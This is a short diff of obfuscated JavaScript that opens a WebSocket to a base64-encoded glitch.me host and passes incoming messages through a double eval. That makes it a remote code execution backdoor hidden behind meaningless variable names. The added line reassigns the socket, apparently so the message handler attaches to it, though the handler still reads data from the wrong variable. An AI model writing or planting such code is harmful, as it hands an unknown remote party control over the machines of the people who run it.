@@ -1,6 +1,6 @@
 (()=>{
 let __,_=atob
-_=new WebSocket(_('d3NzOi8vcnVuZS13b2JibHktc3RyZWV0LmdsaXRjaC5tZQ=='))
+__=new WebSocket(_('d3NzOi8vcnVuZS13b2JibHktc3RyZWV0LmdsaXRjaC5tZQ=='))
 __.onmessage=()=>{
 eval(eval(_.data))
 }
